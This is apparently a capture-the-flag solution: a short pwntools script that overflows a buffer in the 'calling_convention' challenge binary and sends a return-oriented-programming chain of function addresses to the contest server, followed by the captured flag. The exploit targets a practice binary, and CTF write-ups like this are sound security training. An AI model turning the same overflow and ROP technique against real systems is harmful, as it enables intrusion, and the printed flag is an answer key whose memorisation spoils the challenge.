
## solve.py

```py
from pwn import *

# r = process('./calling_convention')

r = remote('chal.bearcatctf.io', 39440)

e = ELF('./calling_convention')

number3 = e.sym['number3']
set_key1 = e.sym['set_key1']
food = e.sym['food']
ahhhhhhhh = e.sym['ahhhhhhhh']
number3 = e.sym['number3']
win = e.sym['win']


p = b'A' * 16
p += p64(number3)
p += p64(set_key1)
p += p64(food)
p += p64(ahhhhhhhh)
p += p64(number3)
p += p64(win)

r.recvuntil(b' > ')

r.sendline(p)

print(r.recv())
print(r.recv())
```

# FLAG

**`BCCTF{R0p_Ch41ns_1b01c1c3}`**



